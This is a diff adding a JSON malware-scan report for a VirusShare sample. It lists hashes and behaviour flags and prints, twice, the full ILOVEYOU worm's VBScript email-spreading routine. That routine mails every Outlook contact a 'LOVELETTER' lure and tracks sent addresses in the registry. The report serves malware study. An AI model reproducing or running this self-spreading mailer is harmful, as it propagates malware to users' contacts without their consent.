@@ -1,0 +1,73 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "RegRead": "May read registry keys",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "sub spreadtoemail()\nOn Error Resume Next\ndim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad\nset regedit=CreateObject(\"WScript.Shell\")\nset out=WScript.CreateObject(\"Outlook.Application\")\nset mapi=out.GetNameSpace(\"MAPI\")\nfor ctrlists=1 to mapi.AddressLists.Count\nset a=mapi.AddressLists(ctrlists)\nx=1\nregv=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a)\nif (regv=\"\") then\nregv=1\nend if\nif (int(a.AddressEntries.Count)>int(regv)) then\nfor ctrentries=1 to a.AddressEntries.Count\nmalead=a.AddressEntries(x)\nregad=\"\"\nregad=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead)\nif (regad=\"\") then\nset male=out.CreateItem(0)\nmale.Recipients.Add(malead)\nmale.Subject = \"ILOVEYOU\"\nmale.Body = vbcrlf&\"kindly check the attached LOVELETTER coming from me.\"\n'male.Attachments.Add(dirsystem&\"\\LOVE-LETTER-FOR-YOU.TXT.vbs\")\nmale.Send\nregedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead,1,\"REG_DWORD\"\nend if\nx=x+1\nnext\nregedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count\nelse\nregedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count\nend if\nnext\n'Set out=Nothing\nSet mapi=Nothing\nend sub"
+    },
+    "filename": "VirusShare_43ddf87e3c3b61a9f2697370d3dfb176",
+    "filesize": 1220,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "43ddf87e3c3b61a9f2697370d3dfb176",
+        "sha1": "69cfc553e138caa65bb6416ad6079b07d343a402",
+        "sha256": "ea420b263b3a9aea73f03f01440ecb2b7cdb3ca302ba3eddd40f8c4872110722"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "sub spreadtoemail()",
+            "On Error Resume Next",
+            "dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad",
+            "set regedit=CreateObject(\"WScript.Shell\")",
+            "set out=WScript.CreateObject(\"Outlook.Application\")",
+            "set mapi=out.GetNameSpace(\"MAPI\")",
+            "for ctrlists=1 to mapi.AddressLists.Count",
+            "set a=mapi.AddressLists(ctrlists)",
+            "regv=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a)",
+            "if (regv=\"\") then",
+            "regv=1",
+            "end if",
+            "if (int(a.AddressEntries.Count)>int(regv)) then",
+            "for ctrentries=1 to a.AddressEntries.Count",
+            "malead=a.AddressEntries(x)",
+            "regad=\"\"",
+            "regad=regedit.RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead)",
+            "if (regad=\"\") then",
+            "set male=out.CreateItem(0)",
+            "male.Recipients.Add(malead)",
+            "male.Subject = \"ILOVEYOU\"",
+            "male.Body = vbcrlf&\"kindly check the attached LOVELETTER coming from me.\"",
+            "'male.Attachments.Add(dirsystem&\"\\LOVE-LETTER-FOR-YOU.TXT.vbs\")",
+            "male.Send",
+            "regedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&malead,1,\"REG_DWORD\"",
+            "end if",
+            "x=x+1",
+            "next",
+            "regedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count",
+            "else",
+            "regedit.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\\\"&a,a.AddressEntries.Count",
+            "end if",
+            "next",
+            "'Set out=Nothing",
+            "Set mapi=Nothing",
+            "end sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269425",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
